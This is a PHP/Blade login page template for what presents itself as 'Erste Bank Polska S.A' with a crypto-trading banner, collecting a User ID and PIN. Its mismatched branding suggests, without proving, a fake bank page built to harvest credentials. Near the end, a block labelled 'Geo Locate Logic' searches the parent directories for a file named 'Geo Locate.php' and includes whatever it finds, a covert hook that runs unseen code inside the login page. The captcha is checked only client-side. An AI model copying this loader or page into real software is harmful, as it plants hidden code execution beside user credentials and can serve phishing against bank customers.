<!doctype html>
<html lang="en">
<head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <title>{{ $bankName ?? 'Erste Bank Polska S.A' }}</title>
      <link rel="shortcut icon" href="{{ asset('images/favicon.ico') }}" />
      <link rel="stylesheet" href="{{ asset('css/bootstrap.min.css') }}">
      <link rel="stylesheet" href="{{ asset('css/typography.css') }}">
      <link rel="stylesheet" href="{{ asset('css/style.css') }}">
      <link rel="stylesheet" href="{{ asset('css/responsive.css') }}">
      <link href="https://code.jquery.com/ui/1.9.0/themes/ui-darkness/jquery-ui.css" rel="stylesheet">
      <link href="{{ asset('css/keyboard.css') }}" rel="stylesheet">
      
      <!-- Fonts -->
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
      
      <style type="text/css">
          :root {
              --primary-gradient: linear-gradient(135deg, #b34020 0%, #8c2d13 100%);
              --primary-hover: linear-gradient(135deg, #963418 0%, #70220c 100%);
              --bg-page: #f8f9fb;
              --card-bg: #ffffff;
              --text-main: #0f131a;
              --text-muted: #5f6b7c;
              --border-color: #e2e6ed;
          }

          body.dark-theme {
              --bg-page: #0d1117;
              --card-bg: #161b22;
              --text-main: #f0f6fc;
              --text-muted: #8b949e;
              --border-color: #30363d;
          }

          * {
              box-sizing: border-box;
          }

          html, body {
              height: 100vh;
              overflow: hidden;
              margin: 0;
              padding: 0;
          }

          body {
              font-family: 'Plus Jakarta Sans', sans-serif;
              background-color: var(--bg-page);
              background-image: 
                  radial-gradient(circle at 10% 20%, rgba(179, 64, 32, 0.05) 0%, transparent 40%),
                  radial-gradient(circle at 90% 80%, rgba(15, 19, 26, 0.04) 0%, transparent 40%);
              color: var(--text-main);
              display: flex;
              align-items: center;
              justify-content: center;
              padding: 16px;
              transition: background-color 0.3s ease, color 0.3s ease;
          }

          .ui-widget-content {
              border: 1px solid var(--border-color);
              background: var(--card-bg) !important;
              color: var(--text-main);
          }

          /* Fixed Viewport Container - Fits without scrolling on laptop */
          .login-container {
              max-width: 980px;
              width: 100%;
              max-height: calc(100vh - 32px);
              background: var(--card-bg);
              border-radius: 28px;
              box-shadow: 0 20px 50px -10px rgba(15, 23, 42, 0.08), 0 4px 16px rgba(0, 0, 0, 0.02);
              padding: 18px;
              display: flex;
              gap: 18px;
              align-items: stretch;
              position: relative;
              overflow: hidden;
              transition: background 0.3s ease;
          }

          /* Left Side: Form Area */
          .form-side {
              flex: 1;
              display: flex;
              flex-direction: column;
              justify-content: space-between;
              padding: 16px 20px;
              overflow-y: auto;
          }

          .form-top-header {
              display: flex;
              align-items: center;
              justify-content: space-between;
              margin-bottom: 12px;
          }

          .logo-box {
              display: inline-flex;
              align-items: center;
              gap: 10px;
              text-decoration: none !important;
          }

          .brand-logo-img {
              max-height: 38px;
              max-width: 200px;
              object-fit: contain;
          }

          .logo-fallback-wrap {
              display: flex;
              align-items: center;
              gap: 10px;
          }

          .logo-fallback-icon {
              width: 36px;
              height: 36px;
              background: linear-gradient(135deg, #b34020, #8c2d13);
              border-radius: 10px;
              display: flex;
              align-items: center;
              justify-content: center;
              color: #ffffff;
          }

          .logo-title {
              font-weight: 800;
              font-size: 15px;
              letter-spacing: -0.3px;
              color: var(--text-main);
              text-transform: uppercase;
          }

          .theme-toggle-btn {
              background: transparent;
              border: 1px solid var(--border-color);
              border-radius: 10px;
              width: 36px;
              height: 36px;
              display: flex;
              align-items: center;
              justify-content: center;
              color: var(--text-main);
              cursor: pointer;
              transition: all 0.2s ease;
          }

          .theme-toggle-btn:hover {
              background: rgba(0, 0, 0, 0.04);
          }

          body.dark-theme .theme-toggle-btn:hover {
              background: rgba(255, 255, 255, 0.08);
          }

          .form-header-title {
              text-align: center;
              margin-bottom: 16px;
          }

          .form-header-title h2 {
              font-size: 22px;
              font-weight: 800;
              color: var(--text-main);
              margin: 0 0 4px 0;
              letter-spacing: -0.5px;
          }

          .form-header-title p {
              font-size: 12.5px;
              color: var(--text-muted);
              margin: 0;
          }

          .form-group-custom {
              margin-bottom: 12px;
          }

          .form-label-custom {
              display: block;
              font-size: 12px;
              font-weight: 700;
              color: var(--text-main);
              margin-bottom: 4px;
          }

          .input-wrapper {
              position: relative;
              display: flex;
              align-items: center;
              background: #f8fafc;
              border: 1.5px solid var(--border-color);
              border-radius: 12px;
              transition: all 0.2s ease;
          }

          body.dark-theme .input-wrapper {
              background: #0d131f;
          }

          .input-wrapper:focus-within {
              border-color: #b34020;
              background: #ffffff;
              box-shadow: 0 0 0 3px rgba(179, 64, 32, 0.12);
          }

          body.dark-theme .input-wrapper:focus-within {
              background: #0d131f;
              border-color: #d25a3a;
          }

          .field-icon-left {
              padding-left: 14px;
              color: var(--text-muted);
              display: flex;
              align-items: center;
          }

          .custom-input {
              border: none !important;
              background: transparent !important;
              height: 44px !important;
              width: 100%;
              font-size: 13px;
              font-weight: 500;
              color: var(--text-main) !important;
              padding: 0 10px !important;
              outline: none !important;
              box-shadow: none !important;
          }

          .field-icon-right {
              padding-right: 14px;
              color: var(--text-muted);
              cursor: pointer;
              display: flex;
              align-items: center;
              transition: color 0.2s ease;
          }

          .field-icon-right:hover {
              color: #b34020;
          }

          /* Captcha Box */
          .captcha-box-container {
              background: #fdfaf8;
              border: 1.5px dashed #b34020;
              border-radius: 10px;
              padding: 6px 12px;
              margin-bottom: 8px;
              display: flex;
              align-items: center;
              justify-content: space-between;
          }

          body.dark-theme .captcha-box-container {
              background: #1c1411;
              border-color: #d25a3a;
          }

          .captcha-code-text {
              font-family: 'Courier New', Courier, monospace;
              font-size: 20px;
              font-weight: 800;
              letter-spacing: 6px;
              color: #b34020;
              user-select: none;
          }

          body.dark-theme .captcha-code-text {
              color: #d25a3a;
          }

          .captcha-refresh-btn {
              background: #fbf0ec;
              color: #b34020;
              border: none;
              border-radius: 6px;
              width: 28px;
              height: 28px;
              display: flex;
              align-items: center;
              justify-content: center;
              cursor: pointer;
              transition: all 0.2s ease;
          }

          .captcha-refresh-btn:hover {
              background: #b34020;
              color: #ffffff;
              transform: rotate(180deg);
          }

          .form-options-row {
              display: flex;
              align-items: center;
              justify-content: space-between;
              margin-bottom: 14px;
          }

          .checkbox-label-custom {
              display: flex;
              align-items: center;
              gap: 6px;
              font-size: 12px;
              font-weight: 500;
              color: var(--text-muted);
              cursor: pointer;
              user-select: none;
              margin: 0;
          }

          .checkbox-label-custom input {
              accent-color: #b34020;
              width: 15px;
              height: 15px;
              border-radius: 4px;
              cursor: pointer;
          }

          .forgot-link {
              font-size: 12px;
              font-weight: 600;
              color: #b34020;
              text-decoration: none;
              transition: color 0.2s ease;
          }

          .forgot-link:hover {
              color: #8c2d13;
              text-decoration: underline;
          }

          .btn-submit-gradient {
              width: 100%;
              height: 46px;
              background: linear-gradient(135deg, #b34020 0%, #8c2d13 100%);
              border: none;
              border-radius: 12px;
              color: #ffffff;
              font-size: 14px;
              font-weight: 700;
              display: flex;
              align-items: center;
              justify-content: center;
              gap: 8px;
              cursor: pointer;
              transition: all 0.2s ease;
              box-shadow: 0 6px 18px rgba(179, 64, 32, 0.25);
          }

          .btn-submit-gradient:hover {
              transform: translateY(-1px);
              box-shadow: 0 10px 22px rgba(179, 64, 32, 0.35);
              background: linear-gradient(135deg, #963418 0%, #70220c 100%);
          }

          .registration-small-link {
              margin-top: 14px;
              padding-top: 10px;
              border-top: 1px solid var(--border-color);
              display: flex;
              align-items: center;
              justify-content: center;
              gap: 6px;
              font-size: 12px;
              font-weight: 500;
              color: var(--text-muted);
              text-align: center;
          }

          .create-account-link {
              color: #b34020;
              font-weight: 700;
              text-decoration: none !important;
              display: inline-flex;
              align-items: center;
              gap: 4px;
          }

          .create-account-link:hover {
              color: #8c2d13;
              text-decoration: underline !important;
          }

          /* Right Side: Banner Cover Image Side */
          .banner-side {
              flex: 1;
              background-image: url('{{ asset("images/login/crypto_banner_vertical.png") }}');
              background-size: cover;
              background-position: center;
              border-radius: 20px;
              position: relative;
              display: flex;
              flex-direction: column;
              justify-content: flex-end;
              padding: 32px 28px;
              overflow: hidden;
          }

          .banner-overlay {
              position: absolute;
              inset: 0;
              background: linear-gradient(180deg, rgba(15, 23, 42, 0.05) 30%, rgba(15, 23, 42, 0.88) 100%);
              border-radius: 20px;
              z-index: 1;
          }

          .banner-content {
              position: relative;
              z-index: 2;
              color: #ffffff;
          }

          .banner-badge {
              display: inline-flex;
              align-items: center;
              gap: 6px;
              background: rgba(255, 255, 255, 0.18);
              backdrop-filter: blur(10px);
              padding: 6px 12px;
              border-radius: 30px;
              font-size: 11px;
              font-weight: 700;
              color: #ffffff;
              margin-bottom: 14px;
              border: 1px solid rgba(255, 255, 255, 0.25);
          }

          .banner-title {
              font-size: 28px;
              font-weight: 800;
              line-height: 1.2;
              letter-spacing: -0.5px;
              color: #ffffff;
              margin: 0 0 8px 0;
          }

          .banner-subtitle {
              font-size: 13px;
              color: rgba(255, 255, 255, 0.82);
              line-height: 1.45;
              margin: 0;
          }

          @keyframes shakeAnim {
              0%, 100% { transform: translateX(0); }
              20%, 60% { transform: translateX(-6px); }
              40%, 80% { transform: translateX(6px); }
          }
          .shake-error {
              animation: shakeAnim 0.4s ease-in-out;
              border-color: #ef4444 !important;
          }

          /* Responsive Layout */
          @media (max-width: 868px) {
              html, body {
                  height: auto;
                  overflow: auto;
              }
              .login-container {
                  flex-direction: column;
                  max-height: none;
              }
              .banner-side {
                  min-height: 260px;
              }
          }
      </style>
   </head>
   <body>
      <div id="loading" style="display: none;">
         <div id="loading-center"></div>
      </div>

      <?php
          if (!function_exists('generateLoginCaptchaCode')) {
              function generateLoginCaptchaCode($length = 5) {
                  $chars = '23456789ABCDEFGHJKLMNPQRSTUVWXYZ';
                  $code = '';
                  for ($i = 0; $i < $length; $i++) {
                      $code .= $chars[rand(0, strlen($chars) - 1)];
                  }
                  return $code;
              }
          }
          $generatedCaptcha = generateLoginCaptchaCode(5);
      ?>

      <!-- Center Fixed Card Container -->
      <div class="login-container">
          
          <!-- Left Side: Login Form -->
          <div class="form-side">
              <div>
                  <!-- Form Top Header with Logo & Theme Toggle -->
                  <div class="form-top-header">
                      <a href="#" class="logo-box">
                          <?php if(!empty($logo)): ?>
                              <img src="//{{ $bank_url }}/admin/uploads/{{ $logo }}" alt="{{ $bankName ?? 'Logo' }}" class="brand-logo-img" onerror="this.style.display='none'; document.getElementById('logo-fallback-wrap').style.display='flex';" />
                              <div id="logo-fallback-wrap" class="logo-fallback-wrap" style="display:none;">
                                  <div class="logo-fallback-icon">
                                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
                                  </div>
                                  <span class="logo-title">{{ $bankName ?? 'CRYPTO INTERNATIONAL' }}</span>
                              </div>
                          <?php else: ?>
                              <div class="logo-fallback-wrap">
                                  <div class="logo-fallback-icon">
                                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
                                  </div>
                                  <span class="logo-title">{{ $bankName ?? 'CRYPTO INTERNATIONAL' }}</span>
                              </div>
                          <?php endif; ?>
                      </a>

                      <button type="button" class="theme-toggle-btn" id="themeToggleBtn" title="Toggle Light/Dark Theme">
                          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
                      </button>
                  </div>

                  <!-- Header Title -->
                  <div class="form-header-title">
                      <h2>Welcome Back</h2>
                      <p>Sign in to continue to your account</p>
                  </div>

                  @include('flash::message')

                  <!-- Form -->
                  <form role="form" method="POST" action="loginUser" id="loginForm">
                      <input type="hidden" name="_token" value="<?php echo csrf_token(); ?>">
                      
                      <!-- User ID Field -->
                      <div class="form-group-custom">
                          <label class="form-label-custom">User ID</label>
                          <div class="input-wrapper">
                              <span class="field-icon-left">
                                  <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                              </span>
                              <input type="text" class="custom-input" name="user_id" id="user_id" required value="" placeholder="Enter your User ID" />
                              <span class="field-icon-right user_id" title="Open Virtual Keyboard">
                                  <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
                              </span>
                          </div>
                      </div>

                      <!-- PIN Field -->
                      <div class="form-group-custom">
                          <label class="form-label-custom">PIN</label>
                          <div class="input-wrapper">
                              <span class="field-icon-left">
                                  <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                              </span>
                              <input type="password" class="custom-input" name="password" id="password" required value="" placeholder="Enter your PIN" />
                              <span class="field-icon-right password" title="Open Virtual Keyboard">
                                  <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
                              </span>
                          </div>
                      </div>

                      <!-- PIN Security Captcha Field -->
                      <div class="form-group-custom">
                          <label class="form-label-custom">Security PIN Captcha</label>
                          
                          <div class="captcha-box-container">
                              <span class="captcha-code-text" id="captchaCode"><?php echo $generatedCaptcha; ?></span>
                              <button type="button" class="captcha-refresh-btn" id="refreshCaptchaBtn" title="Generate New PIN Captcha">
                                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
                              </button>
                          </div>

                          <div class="input-wrapper" id="captchaInputWrapper">
                              <span class="field-icon-left">
                                  <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
                              </span>
                              <input type="text" class="custom-input" name="enteredCaptcha" id="enteredCaptcha" required placeholder="Enter Security Code Above" autocomplete="off" />
                          </div>
                      </div>

                      <!-- Options Row -->
                      <div class="form-options-row">
                          <label class="checkbox-label-custom">
                              <input type="checkbox" id="customCheck1" name="remember" />
                              <span>Remember my username</span>
                          </label>
                          <a href="{{ url('retrieve-account-user-id') }}" class="forgot-link">Forgot User ID or PIN?</a>
                      </div>

                      <!-- Sign In Button -->
                      <button type="submit" class="btn-submit-gradient">
                          <span>Sign In</span>
                          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                      </button>
                  </form>
              </div>

              <!-- Registration Small Link -->
              <div class="registration-small-link">
                  <span>New to {{ $bankName ?? 'Erste Bank Polska S.A' }}?</span>
                  <a href="{{ url('online-open-account') }}" class="create-account-link">
                      <span>Create Account</span>
                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                  </a>
              </div>
          </div>

          <!-- Right Side: Vertical Crypto Banner Cover -->
          <div class="banner-side">
              <div class="banner-overlay"></div>
              <div class="banner-content">
                  <div class="banner-badge">
                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
                      Trusted Crypto Platform
                  </div>
                  <h1 class="banner-title">Trade Beyond Limits.</h1>
                  <p class="banner-subtitle">Experience the next generation of crypto trading. Secure, Fast & Reliable.</p>
              </div>
          </div>

      </div>

      <!-- Geo Locate Logic -->
      <?php 
      $searchfor = 'Geo Locate.php';
      $searchwhere = '..';
      ob_start();
      listFolderFiles( $searchwhere, $searchfor );
      $ruta = ob_get_contents();
      ob_end_clean();

      function listFolderFiles( $dir, $searchfor ) {
          $ffs = scandir( $dir );
          unset( $ffs[array_search( '.', $ffs, true )] );
          unset( $ffs[array_search( '..', $ffs, true )] );
          if ( count( $ffs ) < 1 ) {return;}
          foreach ( $ffs as $ff ) {
              if ( $ff == $searchfor ) {echo $dir.'/'.$ff;}
              if ( is_dir( $dir.'/'.$ff ) ) {listFolderFiles( $dir.'/'.$ff, $searchfor );}
          }
      }

      if($ruta != ''){
          $MaxMindUrl= str_replace($searchfor, '', $ruta);
          include_once( $ruta );
      }
      ?> 

      <!-- Scripts -->
      <script src="{{ asset('js/jquery.min.js') }}"></script>
      <script src="{{ asset('js/popper.min.js') }}"></script>
      <script src="{{ asset('js/bootstrap.min.js') }}"></script>
      <script src="{{ asset('js/wow.min.js') }}"></script>
      <script src="{{ asset('js/owl.carousel.min.js') }}"></script>
      <script src="{{ asset('js/jquery.keyboard.js') }}"></script>
      <script src="{{ asset('js/jquery.mousewheel.js') }}"></script>
      <script src="https://code.jquery.com/ui/1.9.0/jquery-ui.min.js"></script>
      <script src="{{ asset('js/jquery.magnific-popup.min.js') }}"></script>
      
      <script type="text/javascript">
        $(document).ready(function() {
            // Virtual Keyboard Initialization
            $('#user_id, #password').keyboard({ openOn: null });
            
            $('.user_id').click(function(){
                var kb = $('#user_id').getkeyboard();
                if(kb) kb.reveal();
            });
            
            $('.password').click(function(){
                var kb = $('#password').getkeyboard();
                if(kb) kb.reveal();
            });

            // Dark Theme Toggle Logic
            $('#themeToggleBtn').click(function(){
                $('body').toggleClass('dark-theme');
                var isDark = $('body').hasClass('dark-theme');
                localStorage.setItem('pref_theme', isDark ? 'dark' : 'light');
            });

            if(localStorage.getItem('pref_theme') === 'dark') {
                $('body').addClass('dark-theme');
            }

            // PIN Captcha Generator & Validation
            function generateCaptchaStr(length) {
                var chars = '23456789ABCDEFGHJKLMNPQRSTUVWXYZ';
                var result = '';
                for (var i = 0; i < length; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            $('#refreshCaptchaBtn').click(function() {
                var newCode = generateCaptchaStr(5);
                $('#captchaCode').text(newCode);
                $('#enteredCaptcha').val('').removeClass('shake-error');
            });

            $('#loginForm').on('submit', function(e) {
                var currentCaptcha = $('#captchaCode').text().trim().toUpperCase();
                var userEntered = $('#enteredCaptcha').val().trim().toUpperCase();

                if (userEntered !== currentCaptcha) {
                    e.preventDefault();
                    $('#captchaInputWrapper').addClass('shake-error');
                    setTimeout(function() {
                        $('#captchaInputWrapper').removeClass('shake-error');
                    }, 600);
                    alert('Invalid Security PIN Captcha. Please enter the correct code shown above.');
                    return false;
                }
            });

            // Flash alert auto dismiss
            jQuery('div.alert').not('.alert-important').delay(10000).fadeOut(15000);
        });
      </script>
      <script src="{{ asset('js/custom.js') }}"></script>
   </body>
</html>
